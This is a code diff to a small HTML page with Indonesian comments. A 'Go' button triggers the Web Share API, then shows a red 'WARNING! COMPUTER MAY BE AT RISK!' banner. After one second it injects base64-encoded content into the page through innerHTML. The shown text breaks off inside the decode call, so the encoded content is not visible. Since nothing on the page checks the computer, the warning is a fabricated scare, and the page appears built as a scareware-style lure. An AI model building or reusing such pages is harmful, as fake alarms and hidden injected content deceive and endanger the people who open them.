@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Web Share + Base64 Content</title>
+  <title>Web Share + Warning + Base64</title>
   <style>
     body {
       height: 100vh;
@@ -9,6 +9,12 @@
       justify-content: center;
       align-items: center;
       flex-direction: column;
+    }
+    #warning {
+      color: red;
+      font-weight: bold;
+      margin-top: 20px;
+      display: none;
     }
     #content {
       margin-top: 20px;
@@ -19,12 +25,12 @@
 <body>
 
 <button id="shareBtn">Go</button>
+<div id="warning">WARNING! COMPUTER MAY BE AT RISK!</div>
 <div id="content"></div>
 
 <script>
-// Tombol klik
 document.getElementById('shareBtn').onclick = async function() {
-    // 1. Tampilkan Web Share API
+    // 1. Web Share API
     if (navigator.share) {
         try {
             await navigator.share({
@@ -40,7 +46,11 @@ document.getElementById('shareBtn').onclick = async function() {
         alert('Web Share API tidak didukung di browser ini.');
     }
 
-    // 2. Tampilkan konten base64 setelah 1 detik
+    // 2. Tampilkan warning langsung
+    const warningDiv = document.getElementById('warning');
+    warningDiv.style.display = 'block';
+
+    // 3. Tampilkan konten base64 setelah 1 detik
     setTimeout(function() {
         const contentDiv = document.getElementById('content');
         contentDiv.innerHTML = atob(
